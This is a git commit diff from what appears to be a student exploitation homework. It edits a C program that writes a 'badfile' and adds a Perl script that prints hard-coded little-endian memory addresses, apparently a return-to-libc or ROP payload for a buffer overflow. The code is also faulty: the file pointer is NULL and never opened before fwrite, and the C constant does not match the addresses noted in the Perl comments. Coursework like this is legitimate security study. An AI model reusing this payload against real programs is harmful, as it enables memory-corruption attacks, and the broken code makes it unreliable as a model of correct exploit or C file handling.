728afb499b3c93f835dbceaef430987f756f56d1
Nikolas Koxenoglou <koxakin@gmail.com>
2017-04-30 23:06:44 +0300

    Experimented with .c bad file loader/ Added perl badfile loader

--- hw2/badfile_builder.c
+++ hw2/badfile_builder.c
@@ -6,12 +6,14 @@
 
 int main(int argc, char const *argv[]) {
 	char buf[40];
-	FILE *badfile;
+	FILE *badfile = NULL;	
+	
 
-	*(long *) &buf[0] = /*address*/;
-	*(long *) &buf[8] = /*address*/;
-	*(long *) &buf[16] = /*address*/;
+	*(long *) &buf[0] = 0x77179ab9f7ff7f;
+	//*(long *) &buf[8] = /*address*/;
+	//*(long *) &buf[16] = /*address*/;
 
+	printf(" %x\n", buf[1]);
 	fwrite(buf, sizeof(buf), 1, badfile);
 	fclose(badfile);
 	return 0;
---
+++ hw2/badfile_loader.pl
@@ -0,0 +1,13 @@
+#!/usr/bin/perl
+
+#0x 7f ff f7 b9 a1 77
+
+print "\x77\xa1\xb9\xf7\xff\x7f";
+
+#0x 7f ff f7 b9 98 f9
+
+print "\xf9\x98\xb9\xf7\xff\x7f";
+
+#0x 7f ff f7 a1 fc 4d
+
+print "\x4d\xfc\xa1\xf7\xff\x7f";
